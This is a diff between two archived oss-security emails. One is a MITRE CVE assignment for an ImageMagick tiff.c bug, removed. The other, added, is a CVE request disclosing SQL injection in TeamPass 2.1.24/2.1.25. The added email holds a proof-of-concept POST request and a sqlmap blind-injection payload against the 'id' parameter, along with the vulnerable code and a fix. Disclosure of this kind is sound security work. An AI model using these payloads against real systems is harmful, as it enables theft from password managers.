@@ -1,47 +1,121 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/23/4
-Message-ID: <fe5751f9e5494448b7b92dce806bcf49@imshyb02.MITRE.ORG>
-Date: Tue, 22 Nov 2016 19:18:36 -0500
-From: <cve-assign@...re.org>
-To: <ago@...too.org>
-CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>
-Subject: Re: imagemagick: null pointer must never be null (tiff.c)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/14/1
+Message-ID: <CAAjTPb_6JSyPtQRR_xCR0gXv7hCqnu2D0MLgu4aBkex=X-wViQ@mail.gmail.com>
+Date: Thu, 14 Apr 2016 12:08:26 +0800
+From: das das <scusec2010@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request:SQL injection in TeamPass
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello again,
+I sent you an email two days ago,which was misformatted.Now I resend
+it from a gmail account.Hope this time it displays normally.
+I'd like to request a CVE-ID for the vulnerability found in
+TeamPass-2.1.24 and TeamPass-2.1.25. TeamPass is a Passwords Manager
+dedicated for managing passwords in a collaborative way on any server
+Apache, MySQL and PHP.
+Here is the issue,
+========================================
+SQL injection vectors in sources/users.queries.php
+========================================
+-------------------------code_start TeamPass-2.1.24-------------------------
+if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
+    $_SESSION['error']['code'] = ERR_NOT_ALLOWED; //not allowed page
+    include $_SESSION['settings']['cpassman_dir'].'/error.php';
+    exit();
+}
+........
+/**
+* UPDATE MANAGER RIGHTS FOR USER
+*/
+case "gestionnaire":
+  // Check KEY
+  if ($_POST['key'] != $_SESSION['key']) {
+   // error
+    exit();
+    }
+  DB::update(
+    prefix_table("users"),
+    array(
+       'gestionnaire' => $_POST['value']
+      ),
+      "id = ".$_POST['id']
+      );
+  break;
+-------------------------code_end TeamPass-2.1.24--------------------------
+-------------------------code_start TeamPass-2.1.25-------------------------
+if (!checkUser($_SESSION['user_id'], $_SESSION['key'], "manage_users")) {
+    $_SESSION['error']['code'] = ERR_NOT_ALLOWED; //not allowed page
+    include $_SESSION['settings']['cpassman_dir'].'/error.php';
+    exit();
+}
+........
+/**
+* UPDATE MANAGER RIGHTS FOR USER
+*/
+ case "gestionnaire":
+     // Check KEY
+     if ($_POST['key'] != $_SESSION['key']) {
+         // error
+         exit();
+     }
 
-> https://blogs.gentoo.org/ago/2016/11/19/imagemagick-null-pointer-must-never-be-null-tiff-c
+     DB::update(
+         prefix_table("users"),
+         array(
+             'gestionnaire' => $_POST['value'],
+             'admin' => $_POST['value'] == 1 ? "0" : "1",
+             'read_only' => $_POST['value'] == 1 ? "0" : "1"
+            ),
+         "id = ".$_POST['id']
+     );
+     echo prepareExchangedData(array("error" => ""), "encode");
+     break;
+-------------------------code_end TeamPass-2.1.25--------------------------
 
-> coders/tiff.c:655:39: runtime error: null pointer passed as argument 2, which
-> is declared to never be null
-> MagickCore/string_.h:76:23: note: nonnull attribute specified here
+When the post parameter 'type' = 'gestionnaire', the function 'update
+manager rights for user' will be excuted. it checks the user's role in
+the beginning, and needs the authority of manage_user to access to
+this page
+The SQL injection happens in  ---code_start--- "id = ".$_POST['id']
+---code_end---, the post parameter 'id' is not properly handled.
+To execute the SQL query,it verifies that if the the post parameter
+'key' equals session['key'].We can get the key through this
+way：refresh the page(e.g index.php?page=manage_main), capture the
+packet using tools (e.g Burp Suit), and forward the packet,then we can
+get the value of session 'key' in the request body.
+e.p
+http://localhost/teampass/sources/users.queries.php
+POST:
+type=gestionnaire&key=AfVvIafUhSpWwzTnRM9LWEFxrX3gLmK4xoQ4dDDrsPM8.TpnCr&value=0&id=1'
+Sqlmap payload:
+sqlmap identified the following injection point(s) with a total of 43
+HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: type=gestionnaire&key=8ILEoZI08Lkquj5gonpx425wD46ANdkTiIIAJmGVHJhM6S9BaJ&&value=1&id=(SELECT
+(CASE WHEN (6429=6429) THEN 6429 ELSE 6429*(SELECT 6429 FROM
+INFORMATION_SCHEMA.CHARACTER_SETS) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE
+[RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS)
+END))
+---
+To fix it,
+ ---code_start---
+DB::update(
+         prefix_table("users"),
+         array(
+             'gestionnaire' => $_POST['value'],
+             'admin' => $_POST['value'] == 1 ? "0" : "1",
+             'read_only' => $_POST['value'] == 1 ? "0" : "1"
+            ),
+         "id = %i",
+         $_POST['id']
+     );
+ ---code_end---
 
-> https://github.com/ImageMagick/ImageMagick/commit/b61d35eaccc0a7ddeff8a1c3abfcd0a43ccf210b
-
-> coders/tiff.c
-
-Use CVE-2016-9559.
-
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJYNN51AAoJEHb/MwWLVhi2ZScP/3pbrqd7rGuodBIYCs3g/wPt
-8vUfmVszGR1XLLyp6pZ4rWCsndukXim4ZLCDNa/Pru6KzVZiwhwv09/veXn7mD78
-DVYe9Br+bO1h8nP+y3pd1uIOzuDXpIdJYZrNXPkYAE6o4CNEUG6vgL/eC4dHjvtq
-6s8usKsLFULmTlUvQNJoM56mXDn1w3VnOBadMAF6dMlbbn4gyGmW9wwL9d4ebzS+
-tvcWFaU5hUv5qztFNc/vNyNTkziPGU1jRiTkJu2N608ftMGHbMVaMZ90ZuZgOWrA
-234HQE0horOikxFmRDZ/CBCTiV0PO2PzGfPkTFsBChTRzvDa05cF+e5xFhZly5R6
-YiaEFZiGoqrfbwkiIpjAQCKK81YzmRt388GVY7sTxhT+swmoXs5xK2ZhC4tbwad3
-OdCT8ZKvclDRsRJ9aMZDgQrqBPTh/IcwVbq/T0Y5m7r3gw5qbopNwZFlxhLV0X2t
-uWowOUDGHyoRtY1/XjBuuWwNyb7EoNbRWI1bov08UMvfiv47A7mjatsr+qceM7Zo
-shUMkSjsOygvmhd8zgeI7Eubq5BHrsGP1jRLmaaomRQr93CcB+/Wx8VLKxiG0vXw
-lZlfj/tb7r2f48P/h3++VOIm9ew6nbqYD34RL94OJhkxuqwl/2DWD7gIcbfRoMGM
-qbRlEBSoO/ByBIBnigXK
-=CmvN
------END PGP SIGNATURE-----
+This issue was discovered by Mereme[D.A.S] of Information Security
+Institute @ Sichuan University.
+Thank you for your time and guidance!
